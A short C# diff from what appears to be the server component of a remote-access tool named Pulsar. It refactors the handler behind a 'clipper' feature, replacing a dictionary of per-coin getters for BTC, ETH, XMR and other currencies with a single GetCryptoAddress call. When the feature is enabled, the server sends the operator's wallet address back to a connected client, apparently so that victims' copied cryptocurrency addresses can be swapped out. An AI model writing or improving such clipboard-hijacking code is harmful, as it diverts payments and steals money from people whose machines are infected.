@@ -44,22 +44,9 @@ namespace Pulsar.Server.Messages
             FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
             if (frm != null && frm.ClipperCheckbox.Checked)
             {
-                var addressGetters = new Dictionary<string, Func<string>>
+                string address = frm.GetCryptoAddress(message.Type);
+                if (!string.IsNullOrEmpty(address))
                 {
-                    { "BTC", frm.GetBTCAddress },
-                    { "LTC", frm.GetLTCAddress },
-                    { "ETH", frm.GetETHAddress },
-                    { "XMR", frm.GetXMRAddress },
-                    { "SOL", frm.GetSOLAddress },
-                    { "DASH", frm.GetDASHAddress },
-                    { "XRP", frm.GetXRPAddress },
-                    { "TRX", frm.GetTRXAddress },
-                    { "BCH", frm.GetBCHAddress }
-                };
-
-                if (!string.IsNullOrEmpty(message.Type) && addressGetters.TryGetValue(message.Type, out var getAddress))
-                {
-                    string address = getAddress();
                     client.Send(new DoSendAddress
                     {
                         Address = address
